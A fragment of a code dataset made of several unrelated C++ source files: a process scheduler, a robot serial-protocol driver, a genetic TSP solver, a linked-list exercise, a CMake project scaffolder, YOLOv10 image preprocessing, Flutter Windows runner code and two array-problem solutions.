queue1.push_back(process);\n        else if (process.queue_level == 2)\n            queue2.push_back(process);\n        else if (process.queue_level == 3)\n            queue3.push_back(process);\n    }\n\n    int current_time = 0;\n\n    // Procesar Cola 1: RR(3)\n    round_robin(queue1, 3, current_time);\n\n    // Procesar Cola 2: RR(5)\n    round_robin(queue2, 5, current_time);\n\n    // Procesar Cola 3: FCFS\n    fcfs(queue3, current_time);\n\n    // Combinar los resultados\n    processes.clear();\n    processes.insert(processes.end(), queue1.begin(), queue1.end());\n    processes.insert(processes.end(), queue2.begin(), queue2.end());\n    processes.insert(processes.end(), queue3.begin(), queue3.end());\n}\n\n// Funci\u00f3n para imprimir resultados a un archivo\nvoid writeResultsToFile(const vector<Process>& processes, ofstream& file) {\n\n    file << \"# etiqueta; BT; AT; Q; Pr; WT; CT; RT; TAT\\n\";\n    \n    double total_wt = 0, total_ct = 0, total_rt = 0, total_tat = 0;\n    \n    for (const auto& process : processes) {\n        file << process.id << \";\" << process.burst_time << \";\" << process.arrival_time << \";\" \n             << process.queue_level << \";\" << process.priority << \";\" << process.wait_time << \";\" \n             << process.completion_time << \";\" << process.response_time << \";\" << process.turnaround_time << \"\\n\";\n        \n        total_wt += process.wait_time;\n        total_ct += process.completion_time;\n        total_rt += process.response_time;\n        total_tat += process.turnaround_time;\n    }\n    \n    // Imprimir promedios\n    file << \"WT=\" << total_wt / processes.size() << \"; \"\n         << \"CT=\" << total_ct / processes.size() << \"; \"\n",
    "/*********************************************************************\n* Software License Agreement (BSD License)\n* \n*  Copyright (c) 2017-2020, Waterplus http://www.6-robot.com\n*  All rights reserved.\n* \n*  Redistribution and use in source and binary forms, with or without\n*  modification, are permitted provided that the following conditions\n*  are met:\n* \n*   * Redistributions of source code must retain the above copyright\n*     notice, this list of conditions and the following disclaimer.\n*   * Redistributions in binary form must reproduce the above\n*     copyright notice, this list of conditions and the following\n*     disclaimer in the documentation and/or other materials provided\n*     with the distribution.\n*   * Neither the name of the WaterPlus nor the names of its\n*     contributors may be used to endorse or promote products derived\n*     from this software without specific prior written permission.\n* \n*  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n*  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n*  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n*  FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n*  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n*  FOOTPRINTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n*  BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n*  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n*  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n*  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n*  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n*  POSSIBILITY OF SUCH DAMAGE.\n*********************************************************************/\n/*!******************************************************************\n @author     ZhangWanjie\n ********************************************************************/\n\n#include <driver/WPB_Home_driver.h>\n#include <math.h>\n\nstatic bool bFirstQuart = true;\n\nCWPB_Home_driver::CWPB_Home_driver()\n{\n   \tm_SendBuf = new unsigned char[1024];\n\tmemset(m_SendBuf, 0, 1024);\n\tmemset(m_ParseBuf, 0, 128);\n\tm_nRecvIndex = 0;\n\tm_lastRecv = 0;\n\tm_bFrameStart = false;\n\tm_nFrameLength = 14;\n\n\tfor (int i = 0; i < 15;i++)\n\t{\n\t\tarValAD[i] = 0;\n\t}\n\tfor (int i = 0; i < 6;i++)\n\t{\n\t\tarMotorCurrent[i] = 0;\n\t\tarMotorPos[i] = 0;\n\t}\n\tarMotorPos[5] = 47998;\n\tnParseCount = 0;\n\tfQuatW = 0;\n\tfQuatX = 0;\n\tfQuatY = 0;\n\tfQuatZ = 0;\n\t\n\tfGyroX = 0;\n\tfGyroY = 0;\n\tfGyroZ = 0;\n\t\n\tfAccX = 0;\n\tfAccY = 0;\n\tfAccZ = 0;\n\n\tfCurYaw = 0;\n\tfFirstYaw = 0;\n\tbCalFirstYaw = false; \n\n\tfLinearAccLimit = 0.2;\n\tfAngularAccLimit = 0.1;\n\tnSndSrcAngle = 0;\n\tbSndSrcUpdated = false;\n\n\t//mani gripper\n\tarManiGripperValue[0] = 0;\n\tarManiGripperPos[0] = 47998;\n\tarManiGripperValue[1] = 0.034;\n\tarManiGripperPos[1] = 40000;\n\tarManiGripperValue[2] = 0.07;\n\tarManiGripperPos[2] = 30000;\n\tarManiGripperValue[3] = 0.102;\n\tarManiGripperPos[3] = 20000;\n\tarManiGripperValue[4] = 0.133;\n\tarManiGripperPos[4] = 10000;\n\tarManiGripperValue[5] = 0.16;\n\tarManiGripperPos[5] = 0;\n\n\tnLastCmdLiftPos = 0;\n\tnLastCmdGripperPos = 0;\n}\n    \nCWPB_Home_driver::~CWPB_Home_driver()\n{\n\tdelete []m_SendBuf;\n}\n\n\nvoid CWPB_Home_driver::Parse(unsigned char inData)\n{\n\tm_ParseBuf[m_nRecvIndex] = inData;\n\n\tif (m_lastRecv == 0x55 && inData == 0xAA && m_bFrameStart == 0)\n\t{\n\t\tm_bFrameStart = 1;\n\t\tm_ParseBuf[0] = m_lastRecv;\n\t\tm_ParseBuf[1] = inData;\n\t\tm_nRecvIndex = 2;\n\t\tm_lastRecv = 0x00;\n\t\treturn;\n\t}\n\n\tif (m_bFrameStart)\n\t{\n\t\tif (m_nRecvIndex == 3)\n\t\t{\n\t\t\tm_nFrameLength = inData + 8;\n\t\t}\n\n\t\t//put received data into buffer\n\t\tm_ParseBuf[m_nRecvIndex] = inData;\n\t\tm_nRecvIndex++;\n\n\t\t//receive one frame, invoke ParseFrame to parse\n\t\tif (m_nRecvIndex == m_nFrameLength)\n\t\t{\n\t\t\tm_DisRecv();\n\t\t\tm_ParseFrame();\n\t\t\tm_bFrameStart = false;\n\t\t}\n\n\t\t//receive buffer overflow\n\t\tif (m_nRecvIndex >= 128)\n\t\t{\n\t\t\t//m_ResetRcvBuf();\n\t\t\tm_bFrameStart = 0;\n\t\t}\n\t}\n\telse\n\t\tm_lastRecv = inData;\n}\n\n\nvoid CWPB_Home_driver::m_CalSendSum(unsigned char* pNewCmdBuf)\n{\n\tint nLen = pNewCmdBuf[3] + 7;\n\n\tpNewCmdBuf[nLen - 1] = 0x00;\n\tfor (int i = 0; i < nLen - 1; i++)\n\t{\n\t\tpNewCmdBuf[nLen - 1] += pNewCmdBuf[i];\n\t}\n}\n\n\nvoid CWPB_Home_driver::m_ParseFrame()\n{\n\tnParseCount = 0;\n\tif (m_ParseBuf[4] == 0x06)\t//IO_Input\n\t{\n\t\tunsigned char bIOFlag = 0x01;\n\t\tfor(int i=0;i<4;i++)\n\t\t{\n\t\t\tif((m_ParseBuf[8] & bIOFlag) > 0)\n\t\t\t{\n\t\t\t\tarValIOInput[i] = 1;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tarValIOInput[i] = 0;\n\t\t\t}\n\t\t\tbIOFlag = bIOFlag <<1;\n\t\t}\n\t}\n\n\tif (m_ParseBuf[4] == 0x07)\t//AD\n\t{\n\t\tif (m_ParseBuf[8] == 0x01) //AD 0~4\n\t\t{\n\t\t\tfor (int i = 0; i < 5; i++)\n\t\t\t{\n\t\t\t\tarValAD[i] = m_USFromChar(&m_ParseBuf[9 + i * 2]);\n\t\t\t}\n\t\t}\n\t\tif (m_ParseBuf[8] == 0x02) //AD 5~9\n\t\t{\n\t\t\tfor (int i = 0; i < 5; i++)\n\t\t\t{\n\t\t\t\tarValAD[i+5] = m_USFromChar(&m_ParseBuf[9 + i * 2]);\n\t\t\t}\n\t\t}\n\t\tif (m_ParseBuf[8] == 0x03) //AD 10~14\n\t\t{\n\t\t\tfor (int i = 0; i < 5; i++)\n\t\t\t{\n\t\t\t\tarValAD[i+10] = m_USFromChar(&m_ParseBuf[9 + i * 2]);\n\t\t\t}\n\t\t}\n\t}\n\n\tif (m_ParseBuf[",
    "#include <iostream>\n#include <cmath>\n#include <vector>\n#include <random>\n#include <algorithm>\n#include <chrono>\n\ntypedef std::vector<int> tsp_vector_t;\ntypedef std::vector<std::vector<int>> tsp_matrix_t;\n\ntsp_matrix_t create_tsp_matrix();\n\nint evaluate(tsp_vector_t &candidate, tsp_matrix_t &tsp_matrix);\n\ntsp_matrix_t cross(tsp_vector_t &parent1, tsp_vector_t &parent2);\n\nvoid mutate(std::mt19937 gen, tsp_vector_t &candidate, double p);\n\ntsp_matrix_t init_population(std::mt19937 &gen, int pop_size, int num_locs, int start_loc);\n\ntsp_vector_t evaluate_population(tsp_matrix_t &population, tsp_matrix_t &tsp_matrix);\n\ntsp_matrix_t cross_population(tsp_matrix_t &parents);\n\nvoid mutate_population(std::mt19937 gen, tsp_matrix_t &population, double p);\n\n\nint main(){\n    const int POPULATION_SIZE = 500;\n    const int NUM_ITERS = 100;\n    const int NUM_SELECTIONS = 100;\n    const double MUTATION_PROBA = 0.2;\n    const int START_LOC = 0;\n\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    tsp_matrix_t tsp_matrix = create_tsp_matrix();\n    std::size_t tsp_rows(tsp_matrix.size()), tsp_cols(tsp_matrix[0].size());\n    tsp_matrix_t population = init_population(gen, POPULATION_SIZE, tsp_rows, START_LOC);\n    std::size_t pop_size = population.size();\n    tsp_vector_t score_indexes(pop_size);\n    tsp_matrix_t best_candidates(NUM_SELECTIONS);\n    int num_offsprings = (NUM_SELECTIONS % 2 == 0) ? NUM_SELECTIONS : NUM_SELECTIONS+1;\n    tsp_matrix_t offsprings(num_offsprings);\n    tsp_vector_t elite_candidate;\n    int elite_score;\n\n    auto start = std::chrono::high_resolution_clock::now();\n    \n    //populate score indexes\n    for(int j=0; j<pop_size; j++){score_indexes[j]=j;}\n    \n    for(int i=0; i<NUM_ITERS; i++){\n        tsp_vector_t scores = evaluate_population(population, tsp_matrix);\n        std::size_t pop_size = population.size();\n        std::sort(\n            score_indexes.begin(), \n            score_indexes.end(), \n            [&scores](int a, int b){return scores[a] < scores[b];}\n        );\n        elite_candidate = population[score_indexes[0]];\n        elite_score = scores[score_indexes[0]];\n        std::transform(\n            score_indexes.begin(), \n            score_indexes.begin()+NUM_SELECTIONS,\n            best_candidates.begin(), \n            [&population](int idx){\n                return population[idx];\n            }\n        );\n        offsprings = cross_population(best_candidates);\n        mutate_population(gen, offsprings, MUTATION_PROBA);\n\n        for(int j=static_cast<int>(score_indexes.size()-offsprings.size()); j<score_indexes.size(); j++){\n            population[score_indexes[j]] = offsprings[j - static_cast<int>(pop_size - offsprings.size())];\n        }\n    }\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double> duration = (end - start);\n\n    for(int &loc : elite_candidate){\n        std::cout << loc << \"-\";\n    }\n    std::cout << elite_candidate[0] << \"-\";\n    std::cout << \"\\tbest score: \" << elite_score << std::endl; \n    printf(\"duration: %f sec\\n\", duration);\n    return 0;\n}\n\ntsp_matrix_t create_tsp_matrix(){\n    int inv = 999;\n    tsp_matrix_t mat = {\n        // A, B, C, D, E, F\n        {0, 10, inv, inv, inv, 6},    // A\n        {10, 0, 19, inv, 10, inv},    // B\n        {inv, 19, 0, 22, inv, 15},    // C\n        {inv, inv, 22, 0, 5, inv},    // D\n        {inv, 10, inv, 5, 0, 12},     // E\n        {6, inv, 15, inv, 12, 0},     // F\n    };\n    return mat;\n}\n\nint evaluate(tsp_vector_t &candidate, tsp_matrix_t &tsp_matrix){\n    std::size_t len = candidate.size();\n    int dist = 0;\n    int i=0;\n    for(; i<len-1; i++){\n        dist += tsp_matrix[candidate[i]][candidate[i+1]];\n    }\n    dist += tsp_matrix[candidate[i]][candidate[0]];\n    return dist;\n}\n\ntsp_matrix_t cross(tsp_vector_t &parent1, tsp_vector_t &parent2){\n    std::size_t _csize = parent1.size();\n    int _midp = std::floor(_csize / 2);\n    tsp_vector_t offspring1, offspring2;\n\n    offspring1.resize(_midp);\n    std::copy(parent1.begin(), parent1.begin()+_midp, offspring1.begin());\n\n    offspring2.resize(_midp);\n    std::copy(parent2.begin(), parent2.begin()+_midp, offspring2.begin());\n\n    for(int j=0; j<_csize; j++){\n        if(std::count(offspring1.begin(), offspring1.end(), j) == 0){\n            offspring1.push_back(j);\n        }\n        if(std::count(offspring2.begin(), offspring2.end(), j) == 0){\n            offspring2.push_back(j);\n        }\n    }\n    tsp_matrix_t offsprings = {offspring1, offspring2};\n    return offsprings;\n}\n\nvoid mutate(std::mt19937 gen, tsp_vector_t &candidate, double p){\n    std::uniform_real_distribution<double>dist(0.0, 1.0);\n    double rand_num = dist(gen);\n    if(p > rand_num){\n        std::shuffle(candidate.begin()+1, candidate.end(), gen);\n    }    \n}\n\ntsp_matrix_t init_population(std::mt19937 &gen, int pop_size, int num_locs, int start_loc){\n    tsp_vector_t loc_ids(num_locs);\n    tsp_matrix_t population(pop_size);\n    \n    for(int i=0; i<num_locs; i++){\n        ",
    "#include <iostream>\n#include \"unorderedLinkedList.h\"\n\nusing namespace std;\n\nclass intLinkedList : public unorderedLinkedList<int> {\npublic:\n    void splitEvensOddsList(intLinkedList& evensList, intLinkedList& oddsList) {\n        Node<int>* current = head;\n\n        while (current != nullptr) {\n            Node<int>* next = current->getNext();\n\n            if (current->getItem() % 2 == 0) {\n                evensList.insertLast(current->getItem());\n            } else {\n                oddsList.insertLast(current->getItem());\n            }\n\n            current = next;\n        }\n\n        head = nullptr;\n    }\n};\n\nint main() {\n    intLinkedList list;\n    intLinkedList evensList;\n    intLinkedList oddsList;\n    int data;\n\n    cout << \"Enter integers ending with -999: \";\n    while (true) {\n        cin >> data;\n        if (data == -999) {\n            break;\n        }\n        list.insertLast(data);\n    }\n\n    cout << \"List: \";\n    list.display();\n\n    list.splitEvensOddsList(evensList, oddsList);\n\n    cout << \"Evens List: \";\n    evensList.display();\n\n    cout << \"Odds List: \";\n    oddsList.display();\n\n    return 0;\n}",
    "#include \"../include/ProjectManager.h\"\n\n// Function to create the directory structure\nvoid ProjectManager::createDirectoryStructure(const std::string& projectName) {\n    fs::create_directory(projectName);\n    fs::create_directory(projectName + \"/src\");\n    fs::create_directory(projectName + \"/include\");\n    fs::create_directory(projectName + \"/libs\");\n    fs::create_directory(projectName + \"/build\");\n    \n    // Create a basic README.md\n    std::ofstream readme(projectName + \"/README.md\");\n    readme << \"# \" << projectName << std::endl;\n    readme.close();\n\n    // Create a basic CMakeLists.txt\n    std::ofstream cmake(projectName + \"/CMakeLists.txt\");\n    cmake << \"cmake_minimum_required(VERSION 3.10)\\n\";\n    cmake << \"project(\" << projectName << \")\\n\\n\";\n    cmake << \"set(CMAKE_CXX_STANDARD 17)\\n\";\n    cmake << \"include_directories(include)\\n\";\n    cmake << \"add_executable(\" << projectName << \" src/main.cpp)\\n\";\n    cmake << \"target_link_libraries(\" << projectName << \" PRIVATE ${CMAKE_SOURCE_DIR}/libs)\\n\";\n    cmake.close();\n\n    // Create a main.cpp with a simple template\n    std::ofstream mainFile(projectName + \"/src/main.cpp\");\n    mainFile << \"#include <iostream>\\n\\n\";\n    mainFile << \"int main() {\\n\";\n    mainFile << \"    std::cout << \\\"Hello, \" << projectName << \"!\\\" << std::endl;\\n\";\n    mainFile << \"    return 0;\\n\";\n    mainFile << \"}\\n\";\n    mainFile.close();\n}\n\n// Function to copy library files from system to project libs folder\nvoid ProjectManager::copyLibraryFiles(const std::string& libName, const std::string& projectPath) {\n    // Example paths (modify according to your system's library paths)\n    std::vector<std::string> headers = {\n        \"/usr/include/boost\",          // Adjust to the actual path for Boost headers\n        \"/usr/local/include/boost\"\n    };\n\n    std::string libsFolder = projectPath + \"/libs/\" + libName;\n\n    for (const auto& headerPath : headers) {\n        for (const auto& entry : fs::directory_iterator(headerPath)) {\n            if (entry.is_regular_file()) {\n                fs::copy(entry.path(), libsFolder + \"/\" + entry.path().filename().string());\n            }\n        }\n    }\n}\n\n// Function to update CMakeLists.txt to include the new library\nvoid ProjectManager::updateCMakeLists(const std::string& projectPath, const std::string& libName) {\n    std::string cmakeFile = projectPath + \"/CMakeLists.txt\";\n    std::ofstream cmakeOut;\n    cmakeOut.open(cmakeFile, std::ios::app); // Open in append mode\n\n    if (cmakeOut.is_open()) {\n        cmakeOut << \"\\n# Include and link the \" << libName << \" library\\n\";\n        cmakeOut << \"add_subdirectory(libs/\" << libName << \")\\n\";\n        cmakeOut << \"include_directories(libs/\" << libName << \")\\n\";\n        cmakeOut << \"target_link_libraries(${PROJECT_NAME} PRIVATE \" << libName << \")\\n\";\n        cmakeOut.close();\n    } else {\n        std::cerr << \"Error: Could not open CMakeLists.txt\" << std::endl;\n    }\n}\n\n// Function to handle library installation from apt\nvoid ProjectManager::installLibraryViaApt(const std::string& libName) {\n    std::cout << \"Installing library \" << libName << \" via apt...\" << std::endl;\n    std::string command = \"sudo apt install -y \" + libName;\n    int result = system(command.c_str());\n\n    if (result == 0) {\n        std::cout << \"Library \" << libName << \" installed successfully.\" << std::endl;\n    } else {\n        std::cerr << \"Failed to install library \" << libName << \".\" << std::endl;\n    }\n}\n\n// Function to handle installation of libraries into the project\nvoid ProjectManager::installLibrary(const std::string& projectPath, const std::string& libName) {\n    std::string libsFolder = projectPath + \"/libs\";\n    std::string libPath = libsFolder + \"/\" + libName;\n\n    // Create libs folder if it doesn't exist\n    if (!fs::exists(libsFolder)) {\n        fs::create_directory(libsFolder);\n    }\n\n    // Always install the library using apt\n    installLibraryViaApt(libName);\n\n    // Copy the library files to the project\n    copyLibraryFiles(libName, projectPath);\n    updateCMakeLists(projectPath, libName);\n}\n\n// Parse the command and create the project or install a library\nvoid ProjectManager::parseCommand(int argc, char* argv[]) {\n    if (argc >= 3 && std::string(argv[1]) == \"create-project\") {\n        std::string projectName = argv[2];\n        std::cout << \"Creating project: \" << projectName << std::endl;\n        createDirectoryStructure(projectName);\n\n        // Simulate downloading required libraries\n        copyLibraryFiles(\"example-lib\", projectName); // Adjust as needed\n\n        std::cout << \"Project \" << projectName << \" created successfully.\" << std::endl;\n    } \n    else if (argc >= 4 && std::string(argv[1]) == \"install-lib\") {\n        std::string projectPath = argv[2];\n        std::string libraryName = argv[3];\n        std::cout << \"Installing library: \" << libraryName << \" in project \" << projectPath << std::endl;\n        installLibrary(projectPath, libraryName);\n    } \n    else {\n        std::cerr << \"Invalid co",
    "#include \"yolov10.h\"\n#include <regex>\n#include <algorithm>\n#include <cmath>\n\n\nYolov10::~Yolov10(){\n    delete _session;\n}\n\n\n/**\n * @brief Letterbox an image to fit into the target size without changing its aspect ratio.\n * Adds padding to the shorter side to match the target dimensions.\n *\n * @param src Image to be letterboxed.\n * @param target_size Desired output size (width and height should be the same).\n * @param color_padding Color of the padding (default is black).\n * @return Letterboxed image with padding.\n */\nMat Yolov10::letterbox(const Mat& src, const Size& target_size, const Scalar& color_padding){\n    // Calculate scale and padding\n    float scale = std::min(target_size.width / (float)src.cols, target_size.height / (float)src.rows);\n    int new_width = static_cast<int>(src.cols * scale);\n    int new_height = static_cast<int>(src.rows * scale);\n\n    // Resize the image with the computed scale\n    cv::Mat resized_image;\n    cv::resize(src, resized_image, cv::Size(new_width, new_height));\n\n    // Create the output image with the target size and fill it with the padding color\n    cv::Mat dst = cv::Mat::zeros(target_size.height, target_size.width, src.type());\n    dst.setTo(color_padding);\n\n    // Calculate the top-left corner where the resized image will be placed\n    int top = (target_size.height - new_height) / 2;\n    int left = (target_size.width - new_width) / 2;\n\n    // Place the resized image onto the center of the letterboxed image\n    resized_image.copyTo(dst(cv::Rect(left, top, resized_image.cols, resized_image.rows)));\n\n    return dst;\n}\n\n/**\n * @brief Apply Histogram Equalization to an image.\n *\n * @param src Input image in BGR format.\n * @return Image with enhanced contrast.\n */\ncv::Mat Yolov10::applyHistogramEqualization(const cv::Mat &src)\n{\n    cv::Mat ycrcb_image;\n    cv::cvtColor(src, ycrcb_image, cv::COLOR_BGR2YCrCb);  // Convert to YCrCb color space\n\n    std::vector<cv::Mat> channels;\n    cv::split(ycrcb_image, channels);\n\n    // Apply histogram equalization to the Y channel (intensity)\n    cv::equalizeHist(channels[0], channels[0]);\n\n    // Merge back the channels and convert to BGR\n    cv::merge(channels, ycrcb_image);\n    cv::Mat result;\n    cv::cvtColor(ycrcb_image, result, cv::COLOR_YCrCb2BGR);\n\n    return result;\n}\n\n/**\n * @brief Apply CLAHE to an image for adaptive contrast enhancement.\n *\n * @param src Input image in BGR format.\n * @return Image with enhanced local contrast.\n */\nMat Yolov10::applyCLAHE(const Mat& src){\n    cv::Mat lab_image;\n    cv::cvtColor(src, lab_image, cv::COLOR_BGR2Lab);  // Convert to LAB color space\n\n    std::vector<cv::Mat> lab_planes;\n    cv::split(lab_image, lab_planes);\n\n    // Apply CLAHE to the L channel (lightness)\n    cv::Ptr<cv::CLAHE> clahe = cv::createCLAHE();\n    clahe->setClipLimit(4.0);  // Set the clip limit for contrast enhancement\n    clahe->apply(lab_planes[0], lab_planes[0]);\n\n    // Merge the planes back and convert to BGR\n    cv::merge(lab_planes, lab_image);\n    cv::Mat result;\n    cv::cvtColor(lab_image, result, cv::COLOR_Lab2BGR);\n\n    return result;\n}\n\n/**\n * @brief Apply Gamma Correction to an image.\n *\n * @param src Input image in BGR format.\n * @param gamma Gamma value for correction. Values < 1 will lighten the image, values > 1 will darken it.\n * @return Image with gamma correction applied.\n */\ncv::Mat Yolov10::applyGammaCorrection(const cv::Mat &src, float gamma)\n{\n    cv::Mat lut(1, 256, CV_8UC1);\n    uchar* p = lut.ptr();\n    for (int i = 0; i < 256; ++i)\n    {\n        p[i] = cv::saturate_cast<uchar>(std::pow(i / 255.0, gamma) * 255.0);\n    }\n\n    cv::Mat result;\n    cv::LUT(src, lut, result);  // Apply the gamma lookup table to the image\n\n    return result;\n}\n\n/*\n * Function to preprocess the image\n *\n * @param image: input image as cv::Mat\n * @return: vector of floats representing the preprocessed image\n */\nvector<float> Yolov10::preprocess(const Mat& image){\n    clock_t start_time = clock();\n\n    if (image.empty())\n    {\n        throw std::runtime_error(\"Could not read the image\");\n    }\n\n    _orig_width = image.cols;\n    _orig_height = image.rows;\n\n    // Step 1: Apply image enhancement techniques\n    cv::Mat enhanced_image = applyCLAHE(image);  // Use CLAHE as an example\n    // cv::Mat enhanced_image = applyHistogramEqualization(image);  // Or use Histogram Equalization\n    // cv::Mat enhanced_image = applyGammaCorrection(image, 1.2);  // Or use Gamma Correction\n\n    // Step 2: Apply letterbox to the enhanced image\n    cv::Mat letterboxed_image = letterbox(enhanced_image, Size(_input_shape[2], _input_shape[3]), _color_padding);\n\n    // Step 3: Convert image to float and normalize\n    letterboxed_image.convertTo(letterboxed_image, CV_32F, 1.0 / 255);\n\n    // Step 4: Convert from BGR to RGB\n    cv::cvtColor(letterboxed_image, letterboxed_image, cv::COLOR_BGR2RGB);\n\n    // Step 5: Prepare the input tensor values as a 1D vector\n    std::vector<float> input_tensor_values;\n    input_tensor_values.reserve(_input_shape",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//{ Driver Code Starts\n// Initial Template for C++\n#include <bits/stdc++.h>\nusing namespace std;\n\n\n// } Driver Code Ends\n// User function Template for C++\nclass Solution {\n  public:\n    // Function to find the sum of contiguous subarray with maximum sum.\n    int maxSubarraySum(vector<int> &arr) {\n        // code here...\n           int ans = arr[0];\n        int update = 0;\n        for(int i=0;i<arr.size();i++){\n            update += arr[i];\n            ans = max(update, ans);\n            if(update < 0){\n                update = 0;\n            }\n        }\n        return ans;\n    }\n};\n\n//{ Driver Code Starts.\n\nint main() {\n    int t;\n    cin >> t;\n    cin.ignore(); // To discard any leftover newline characters\n    while (t--)   // while testcases exist\n    {\n        vector<int> arr;\n        string input;\n        getline(cin, input); // Read the entire line for the array elements\n        stringstream ss(input);\n        int number;\n        while (ss >> number) {\n            arr.push_back(number);\n        }\n\n        Solution ob;\n        cout << ob.maxSubarraySum(arr) << endl;\n    }\n}\n// } Driver Code Ends",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_error_handler_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//{ Driver Code Starts\n#include <bits/stdc++.h>\nusing namespace std;\n\n\n// } Driver Code Ends\nclass Solution {\n  public:\n    vector<int> subarraySum(vector<int> &arr, int sum) {\n        // code here\n         int s = 0, e = 0;  // Initialize window\n  \n    vector<int> res;\n\n    int curr = 0;\n    for (int i = 0; i < arr.size(); i++) {\n        curr += arr[i];\n\n        // If current sum becomes more or equal,\n        // set end and try adjusting start\n        if (curr >= sum) {\n            e = i;\n\n            // While current sum is more\n            // remove, starting elements of\n            // current window\n            while (curr > sum && s < e) {\n                curr -= arr[s];\n                ++s;\n            }\n\n            // If we found a subraay\n            if (curr == sum) {\n                res.push_back(s + 1);\n                res.push_back(e + 1);\n                return res;\n            }\n        }\n    }\n\n    return {-1}; // Never found a subarray\n    }\n};\n\n//{ Driver Code Starts.\n\nint main() {\n    int t;\n    cin >> t;\n    cin.ignore(); // Ignore the newline character after t\n    while (t--) {\n        vector<int> arr;\n        int d;\n        string input;\n\n        getline(cin, input); // Read the entire line for the array elements\n        stringstream ss(input);\n        int number;\n        while (ss >> number) {\n            arr.push_back(number);\n        }\n\n        cin >> d;\n        cin.ignore(); // Ignore the newline character after d\n\n        Solution ob;\n        vector<int> result = ob.subarraySum(arr, d);\n        for (int i : result) {\n            cout << i << \" \";\n        }\n        cout << \"\\n\";\n    }\n    return 0;\n}\n\n// } Driver Code Ends",
